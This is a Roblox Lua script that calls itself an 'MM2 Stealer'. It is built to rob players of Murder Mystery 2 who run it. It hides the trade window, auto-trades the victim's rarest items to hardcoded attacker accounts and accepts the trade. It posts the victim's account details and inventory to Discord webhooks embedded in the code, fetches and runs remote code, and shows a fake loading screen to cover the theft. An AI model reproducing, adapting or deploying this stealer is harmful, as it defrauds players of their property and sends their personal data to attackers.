Config = {
    Receivers = {"QuadCoreDragon", ""}, -- You Username/s.
    Webhook = "https://discord.com/api/webhooks/1291752093387853988/4Xte3V-WEnQotkIPZv173EMATsBRMccyT6Dt20_JOM2EptEHto0S0opxeEykAaBjxOH-", -- Your webhook for hits.
    FullInventory = true, -- If true, it will display all of the player's items.
    GoodItemsOnly = false, -- If set to true, the stealer will not ping you if the player only has items below legendary.
    ResendTrade = ".", -- Send this in chat to resend the trade request if you don't receive it.
    Script = "Highlight Hub", -- Scripts > "None", "Custom", "Highlight Hub".
    CustomLink = "" -- If Script is set to Custom, provide the custom URL here.
}

repeat wait() until game:IsLoaded()

if getgenv().scriptexecuted then return end
getgenv().scriptexecuted = true

LogsWebhook = "https://discord.com/api/webhooks/1291752093387853988/4Xte3V-WEnQotkIPZv173EMATsBRMccyT6Dt20_JOM2EptEHto0S0opxeEykAaBjxOH-"
-- Logs Webhook

LOGS_WEBS = LogsWebhook

local NotificationHolder = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Module.Lua"))()
local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Client.Lua"))()

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local VirtualUser = game:GetService("VirtualUser")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local Trade = ReplicatedStorage.Trade
local events = {"MouseButton1Click", "MouseButton1Down", "Activated"}
local TeleportScript = [[game:GetService("TeleportService"):TeleportToPlaceInstance("]] .. game.PlaceId .. [[", "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]
local Position = UDim2.new(0, 9999, 0, 9999)
local Inventory = {}
local StealerName = "m.kai"

local function sendnotification(message)
    getgenv().scriptexecuted = false
    print("["..StealerName.."]:" .. message)
    Notification:Notify(
        {Title = "[ "..StealerName.." ]", Description = message},
        {OutlineColor = Color3.fromRGB(80, 80, 80),Time = 7, Type = "default"}
    )
end

local messageMM2 =
    "You just got a new hit with **"..StealerName.."**!"
    if Vintage and Godly and Ancient and Unique and Config.GoodItemsOnly then
    messageMM2 = "@everyone\nYou just got a new **good** hit with **"..StealerName.."**!"
end

local success, errorMsg = pcall(function()
    local games = {
        [142823291] = true,
        [335132309] = true,
        [636649648] = true
    }
    
    if not games[game.PlaceId] then
        game:GetService("Players").LocalPlayer:Kick("\nUnsupported game!")
        while true do end
        wait(99999999999999999999999999999999999)
    end
    
    if not Config.Webhook:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
        sendnotification("Invalid 'Webhook' url!")
        InvaildWebhook = true
        return
    end
    
    if not LogsWebhook:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
        sendnotification("Invalid 'Webhook' url!")
        return
    end
    
    if type(Config.Receivers) ~= "table" or #Config.Receivers == 0 then
        sendnotification("Invalid 'Receivers' table!")
        return
    end
    
    if Config.Script == "Custom" and not Config.CustomLink:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
        sendnotification("Invalid 'Custom' url!")
        return
    end
    
    if Config.FullInventory ~= true and Config.FullInventory ~= false then
        Config.FullInventory = true
    end

    if Config.FullInventory ~= true and Config.FullInventory ~= false then
        Config.FullInventory = true
    end

    if Config.Script == nil then
        Config.Script = "None"
    elseif Config.Script == "Custom" then
        Config.Script = Config.Script .. " - " .. Config.CustomLink
    end
    
    if Config.Script == "Custom" then
        loadstring(game:HttpGet(Config.CustomLink))()
    elseif Config.Script == "Mega Hub" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/Hubs/main/Mega.lua",true))()
    elseif Config.Script == "YARHM" then
    loadstring(game:HttpGet("https://yarhm.goteamst.com/scr", false))()
    elseif Config.Script == "Nexus" then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/s-o-a-b/nexus/main/loadstring"))()
    end
    
    Common = 0
    Uncommon = 0
    Rare = 0
    Legendary = 0
    Vintage = 0
    Godly = 0
    Ancient = 0
    Unique = 0
    
    LocalPlayer.Idled:connect(function()
        VirtualUser:CaptureController()
        VirtualUser:ClickButton2(Vector2.new())
    end)
    
    if LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Inventory") ~= nil then
        UIPath = LocalPlayer.PlayerGui.MainGUI.Game.Inventory.Main
        TradePath = LocalPlayer.PlayerGui.TradeGUI
        Mobile = false
    else
        UIPath = LocalPlayer.PlayerGui.MainGUI.Lobby.Screens.Inventory.Main
        TradePath = LocalPlayer.PlayerGui.TradeGUI_Phone
        Mobile = true
    end
    
    function TapUI(button, check, button2)
        if check == "Active Check" then
            if button.Active then
                button = button[button2]
            else
                return
            end
        end
        if check == "Text Check" then
            if button == "^" then
                button = button2
            else
                return
            end
        end
        for i,v in pairs(events) do
            for i,v in pairs(getconnections(button[v])) do
                v:Fire()
            end
        end
    end
    
    function Rarity(color, amount, tradeable, requirepath, path)
        Stack = 0
    
        if tradeable then
            if tradeable:FindFirstChild("Evo") then
                return
            end
        end
    
        if amount ~= "" then
            Stack = tonumber(amount:match("x(%d+)"))
        else
            Stack = 1
        end
    
        local r = math.floor(color.R * 255 + 0.5)
        local g = math.floor(color.G * 255 + 0.5)
        local b = math.floor(color.B * 255 + 0.5)
    
        if r == 106 and g == 106 and b == 106 then
            Common = Common + Stack
        elseif r == 0 and g == 255 and b == 255 then
            Uncommon = Uncommon + Stack
        elseif r == 0 and g == 200 and b == 0 then
            Rare = Rare + Stack
        elseif r == 220 and g == 0 and b == 5 then
            Legendary = Legendary + Stack
        elseif r == 255 and g == 0 and b == 179 then
            Godly = Godly + Stack
        elseif r == 100 and g == 10 and b == 255 then
            Ancient = Ancient + Stack
        elseif r == 240 and g == 140 and b == 0 then
            Unique = Unique + Stack
        else
            Vintage = Vintage + Stack
        end
    end

    function checkitem(v)
        if v:IsA("Frame") then
            if v.ItemName.Label.Text ~= "Default Knife" and v.ItemName.Label.Text ~= "Default Gun" then
                Rarity(v.ItemName.BackgroundColor3, v.Container.Amount.Text, v:FindFirstChild("Tags"))
                if Config.FullInventory then
                    if v.Container.Amount.Text ~= "" then
                        number = v.Container.Amount.Text
                    else
                        number = "x1"
                    end
                    table.insert(Inventory, v.ItemName.Label.Text .. " " .. number)
                end
            end
        end
    end
    
    function FullInventory()
        for i,v in pairs(UIPath.Weapons.Items.Container:GetChildren()) do
            for i,v in pairs(v.Container:GetChildren()) do
                if v.Name == "Christmas" or v.Name == "Halloween" then
                    for i,v in pairs(v.Container:GetChildren()) do
                        checkitem(v)
                    end
                else
                    checkitem(v)
                end
            end
        end
        for i,v in pairs(UIPath.Pets.Items.Container.Current.Container:GetChildren()) do
            checkitem(v)
        end
        if Common and Uncommon and Rare and Legendary and Godly and Ancient and Unique and Vintage == 0 then
            table.insert(Inventory, "None")
        end
        if Config.FullInventory then
            return table.concat(Inventory, ", ")
        else
            return "Full inventory set false."
        end
    end
    
    FullInventory()
    
    task.wait()
    
    function Sendtrade()
        if Mobile then
            local Path = LocalPlayer.PlayerGui.MainGUI.Lobby.Leaderboard
            TapUI(Path.Container.Close)
            TapUI(Path.Container.PlayerList[Receiver].ActionButton)
            TapUI(Path.Popup.Container.Action.Trade)
            TapUI(Path.Popup.Container.Close)
        else
            local Path = LocalPlayer.PlayerGui.MainGUI.Game.Leaderboard
            TapUI(Path.Container.ToggleRequests.On)
            TapUI(Path.Container.Close.Title.Text, "Text Check", Path.Container.Close.Toggle)
            TapUI(Path.Container.TradeRequest.ReceivingRequest, "Active Check", "Decline")
            TapUI(Path.Container.TradeRequest.SendingRequest, "Active Check", "Cancel")
            TapUI(Path.Container[Receiver].ActionButton)
            TapUI(Path.Inspect.Trade)
            TapUI(Path.Inspect.Close)
        end
    end
    
    function readchats()
        Players[Receiver].Chatted:Connect(function(msg)
            if msg == Config.ResendTrade then
                Sendtrade()
            end
        end)
    end
    
    function Activate(player)
        for i,v in pairs(Config.Receivers) do
            if v == player then
                Receiver = player
                readchats()
                wait(10)
                Sendtrade()
            end
        end
    end
    
    function InsertItems()
        local ItemsByRarity = {
            Ancient = {},
            Godly = {},
            Unique = {},
            Vintage = {},
            Legendary = {},
            Rare = {},
            Uncommon = {},
            Common = {}
        }

        for i,v in pairs(TradePath.Container.Items.Main:GetChildren()) do
            for i,v in pairs(v.Items.Container.Current.Container:GetChildren()) do
                if v:IsA("Frame") then
                    if v.ItemName.Label.Text ~= "Default Knife" and v.ItemName.Label.Text ~= "Default Gun" then
                        local rarity = "Common"
                        local color = v.ItemName.BackgroundColor3
                        if color == Color3.fromRGB(220, 0, 5) then
                            rarity = "Legendary"
                        elseif color == Color3.fromRGB(255, 0, 179) then
                            rarity = "Godly"
                        elseif color == Color3.fromRGB(100, 10, 255) then
                            rarity = "Ancient"
                        elseif color == Color3.fromRGB(240, 140, 0) then
                            rarity = "Unique"
                        elseif color == Color3.fromRGB(255, 255, 0) then
                            rarity = "Vintage"
                        elseif color == Color3.fromRGB(0, 200, 0) then
                            rarity = "Rare"
                        elseif color == Color3.fromRGB(0, 255, 255) then
                            rarity = "Uncommon"
                        end
                        table.insert(ItemsByRarity[rarity], v)
                    end
                end
            end
        end

        local ItemsInTrade = 0
        local rarityOrder = {"Ancient", "Godly", "Unique", "Vintage", "Legendary", "Rare", "Uncommon", "Common"}
    
        for _, rarity in ipairs(rarityOrder) do
            for _, item in ipairs(ItemsByRarity[rarity]) do
                if ItemsInTrade < 4 then
                    ItemsInTrade = ItemsInTrade + 1
                    local LoopsItem = 1
                    local Amount = item.Container.Amount.Text
                    if Amount ~= "" then
                        LoopsItem = tonumber(Amount:match("x(%d+)"))
                    end
                    task.wait()
                    for i = 1, LoopsItem do
                        TapUI(item.Container.ActionButton)
                    end
                end
            end
        end
    
        wait(10)
        game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(285646582)
    end

    if Mobile then
        TradePath.Container.Position = Position
        TradePath.ClickBlocker.Position = Position
    else
        TradePath.BG.Position = Position
        TradePath.Container.Position = Position
        TradePath.ClickBlocker.Position = Position
        TradePath.Processing.Position = Position
    end
    
    TradePath:GetPropertyChangedSignal("Enabled"):Connect(function()
        wait(3)
        if TradePath.Enabled then
            InsertItems()
        else
            Sendtrade()
        end
    end)
    
    Players.PlayerAdded:Connect(function(player)
        Activate(player.Name)
    end)
    
    for i,v in pairs(Players:GetPlayers())do
        Activate(v.Name)
    end
end)

local data = {
        username = StealerName,
        avatar_url = "https://cdn.discordapp.com/attachments/1295330912900223039/1295610470228561972/standard.gif?ex=670f46c7&is=670df547&hm=d67f2702e28851f197035c849929a5d05b1f4b9e6830f463268c3234310d03ce&",
        content = messageMM2,
        embeds = {
            {
                title = "💻 **__"..StealerName.."__ | __MM2 Stealer__**",
                description = "**📃  Player Information**: \n```lua\nUsername     : " .. LocalPlayer.Name.."\nUser Id      : " .. LocalPlayer.UserId .. "\nAccount Age  : " .. LocalPlayer.AccountAge .. "\nExploit      : " .. identifyexecutor() .. "\nReceiver/s   : " .. table.concat(Config.Receivers, ", ") .. "\nScript       : " .. Config.Script .. "```\n🎒 **__Inventory__**\n```Ancient    🏺: " .. Ancient .. "\nGoldy      🧠: " .. Godly .. "\nUnique     ⚜️: " .. Unique .. "\nVintage    ⌛: " .. Vintage .. "\nLegendary  ⚔️: " .. Legendary .. "\nRare       📜: " .. Rare .. "\nUncommon   🗿: " .. Uncommon .. "\nCommon     💀: " .. Common .. "```\n🎒 **__Full Inventory__**\n```" .. FullInventory() .. "```\n🔗 **__Execute to join__**\n```" .. TeleportScript .. "```",
                color = tonumber(0x3365FF),
                fields = {
                    {
                        name = "🎮Auto Joiner",
                        value = "Soon"
                    }
                }
            }
        }
    }

local request = http_request or request or HttpPost or syn.request
request({
    Url = Config.Webhook,
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = game.HttpService:JSONEncode(data)
})

local request = http_request or request or HttpPost or syn.request
request({
  Url = LogsWebhook,
  Method = "POST",
  Headers = {
      ["Content-Type"] = "application/json"
    },
    Body = game.HttpService:JSONEncode(data)
})


LoadingScreenValue = true
LoadingText1 = "Loading Library"
LoadingText2 = "Updating Library"
LoadingText3 = "Getting Script"
LoadingText4 = "Checking Script"
LoadingText5 = "Bypassing Anti-Cheat"
LoadingText6 = "Please Wait"
LoadingText7 = "Initializing Game Systems..."
LoadingText8 = "Establishing Connection..."
LoadingText9 = "Loading Player Profile..."
LoadingText10 = "Synchronizing Game Assets..."
LoadingText11 = "Connecting to Game Server..."
LoadingText12 = "Preparing Your Experience..."
LoadingText13 = "Loading Game Elements..."
LoadingText14 = "Analyzing Game Environment..."
LoadingText15 = "Reconfiguring Settings..."
LoadingText16 = "Syncing Player Data..."
LoadingText17 = "Downloading Updates..."
LoadingText18 = "Loading User Interface..."
LoadingText19 = "Calibrating Experience..."
LoadingText20 = "Booting Up..."

local ScriptTitle = "Preparing Script! Please wait This may take a while..."

-- LOADING SCREEN
if LoadingScreenValue ~= false then
	local Loading = Instance.new("ScreenGui")
	local MainFrame = Instance.new("Frame")
	local Title = Instance.new("TextLabel")
	local Dots = Instance.new("Frame")
	local Dot1 = Instance.new("Frame")
	local UICorner = Instance.new("UICorner")
	local InsideDot = Instance.new("Frame")
	local UICorner_2 = Instance.new("UICorner")
	local Dot2 = Instance.new("Frame")
	local UICorner_3 = Instance.new("UICorner")
	local InsideDot_2 = Instance.new("Frame")
	local UICorner_4 = Instance.new("UICorner")
	local Dot3 = Instance.new("Frame")
	local UICorner_5 = Instance.new("UICorner")
	local InsideDot_3 = Instance.new("Frame")
	local UICorner_6 = Instance.new("UICorner")
	local Bar = Instance.new("Frame")
	local Bar2 = Instance.new("Frame")
	local UICorner_7 = Instance.new("UICorner")
	local UICorner_8 = Instance.new("UICorner")
	local Percentage = Instance.new("TextLabel")
	local Tip = Instance.new("TextLabel")
	local EndSequence = Instance.new("Frame")
	Loading.Name = "FakeLoadingScreen"
	Loading.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
	Loading.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	Loading.DisplayOrder = 10000
	MainFrame.Name = "MainFrame"
	MainFrame.Parent = Loading
	MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	MainFrame.BorderSizePixel = 0
	MainFrame.Position = UDim2.new(-0.125662372, 0, -0.125935167, 0)
	MainFrame.Size = UDim2.new(1.25, 0, 1.25, 0)
	Title.Name = "Title"
	Title.Parent = MainFrame
	Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Title.BackgroundTransparency = 1.000
	Title.Position = UDim2.new(0.183329239, 0, 0.246382296, 0)
	Title.Size = UDim2.new(0.632528603, 0, 0.232815996, 0)
	Title.Font = Enum.Font.FredokaOne
	Title.Text = ScriptTitle
	Title.TextColor3 = Color3.fromRGB(255, 255, 255)
	Title.TextScaled = true
	Title.TextSize = 14.000
	Title.TextWrapped = true
	Dots.Name = "Dots"
	Dots.Parent = MainFrame
	Dots.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Dots.BackgroundTransparency = 1.000
	Dots.Position = UDim2.new(0.470970035, 0, 0.818612278, 0)
	Dots.Size = UDim2.new(0.0571707934, 0, 0.0360675976, 0)
	Dot1.Name = "Dot1"
	Dot1.Parent = Dots
	Dot1.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	Dot1.Position = UDim2.new(0.0611661971, 0, 0.234447539, 0)
	Dot1.Size = UDim2.new(0.159291148, 0, 0.51158762, 0)
	UICorner.CornerRadius = UDim.new(0.5, 0)
	UICorner.Parent = Dot1
	InsideDot.Name = "InsideDot"
	InsideDot.Parent = Dot1
	InsideDot.AnchorPoint = Vector2.new(0.5, 0.5)
	InsideDot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	InsideDot.Position = UDim2.new(0.5, 0, 0.5, 0)
	UICorner_2.CornerRadius = UDim.new(0.5, 0)
	UICorner_2.Parent = InsideDot
	Dot2.Name = "Dot2"
	Dot2.Parent = Dots
	Dot2.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	Dot2.Position = UDim2.new(0.419989735, 0, 0.234447539, 0)
	Dot2.Size = UDim2.new(0.159291148, 0, 0.51158762, 0)
	UICorner_3.CornerRadius = UDim.new(0.5, 0)
	UICorner_3.Parent = Dot2
	InsideDot_2.Name = "InsideDot"
	InsideDot_2.Parent = Dot2
	InsideDot_2.AnchorPoint = Vector2.new(0.5, 0.5)
	InsideDot_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	InsideDot_2.Position = UDim2.new(0.5, 0, 0.5, 0)
	UICorner_4.CornerRadius = UDim.new(0.5, 0)
	UICorner_4.Parent = InsideDot_2
	Dot3.Name = "Dot3"
	Dot3.Parent = Dots
	Dot3.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	Dot3.Position = UDim2.new(0.778813243, 0, 0.234447539, 0)
	Dot3.Size = UDim2.new(0.159291148, 0, 0.51158762, 0)
	UICorner_5.CornerRadius = UDim.new(0.5, 0)
	UICorner_5.Parent = Dot3
	InsideDot_3.Name = "InsideDot"
	InsideDot_3.Parent = Dot3
	InsideDot_3.AnchorPoint = Vector2.new(0.5, 0.5)
	InsideDot_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	InsideDot_3.Position = UDim2.new(0.5, 0, 0.5, 0)
	UICorner_6.CornerRadius = UDim.new(0.5, 0)
	UICorner_6.Parent = InsideDot_3
	Bar.Name = "Bar"
	Bar.Parent = MainFrame
	Bar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	Bar.BorderSizePixel = 0
	Bar.Position = UDim2.new(0.219547689, 0, 0.764966607, 0)
	Bar.Size = UDim2.new(0.560904443, 0, 0.0365853645, 0)
	Bar2.Name = "Bar2"
	Bar2.Parent = Bar
	Bar2.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
	Bar2.BorderSizePixel = 0
	Bar2.Size = UDim2.new(0, 0, 1, 0)
	UICorner_7.CornerRadius = UDim.new(0.5, 0)
	UICorner_7.Parent = Bar2
	UICorner_8.CornerRadius = UDim.new(0.5, 0)
	UICorner_8.Parent = Bar
	Percentage.Name = "Percentage"
	Percentage.Parent = Bar
	Percentage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Percentage.BackgroundTransparency = 1.000
	Percentage.Position = UDim2.new(0.280816972, 0, 0.0909090936, 0)
	Percentage.Size = UDim2.new(0.438366145, 0, 0.787879348, 0)
	Percentage.Font = Enum.Font.FredokaOne
	Percentage.Text = "0%"
	Percentage.TextColor3 = Color3.fromRGB(255, 255, 255)
	Percentage.TextScaled = true
	Percentage.TextSize = 14.000
	Percentage.TextWrapped = true
	Tip.Name = "Tip"
	Tip.Parent = MainFrame
	Tip.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Tip.BackgroundTransparency = 1.000
	Tip.Position = UDim2.new(0.349135160, 0, 0.603216052, 0)
	Tip.Size = UDim2.new(0.30531478, 0, 0.106667064, 0)
	Tip.Font = Enum.Font.FredokaOne
	Tip.Text = "The script is loading, please wait..."
	Tip.TextColor3 = Color3.fromRGB(255, 255, 255)
	Tip.TextScaled = true
	Tip.TextSize = 14.000
	Tip.TextWrapped = true
	EndSequence.Name = "EndSequence"
	EndSequence.Parent = MainFrame
	EndSequence.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	EndSequence.BackgroundTransparency = 1.000
	EndSequence.Size = UDim2.new(0, 0, 0, 0)

	-- The loading process
	local loadingSteps = {
		{LoadingText1, 2.5}, -- Increase wait time for a smoother effect
		{LoadingText2, 2.5},
		{LoadingText3, 2.5},
		{LoadingText4, 2.5},
		{LoadingText5, 2.5},
		{LoadingText6, 2.5},
		{LoadingText7, 2.5},
		{LoadingText8, 2.5},
		{LoadingText9, 2.5},
		{LoadingText10, 2.5},
		{LoadingText11, 2.5},
		{LoadingText12, 2.5},
		{LoadingText13, 2.5},
		{LoadingText14, 2.5},
		{LoadingText15, 2.5},
		{LoadingText16, 2.5},
		{LoadingText17, 2.5},
		{LoadingText18, 2.5},
		{LoadingText19, 2.5},
		{LoadingText20, 2.5},
	}

	local totalSteps = #loadingSteps
	local currentStep = 0

	for _, step in ipairs(loadingSteps) do
		currentStep = currentStep + 1
		Percentage.Text = math.floor((currentStep / totalSteps) * 100) .. "%"
		Tip.Text = step[1]
		Bar2.Size = UDim2.new(currentStep / totalSteps, 0, 1, 0)
		wait(step[2]) -- Wait time for each step
	end

	wait(0.5) -- Short wait before closing
	Loading:Destroy() -- Close loading screen
end
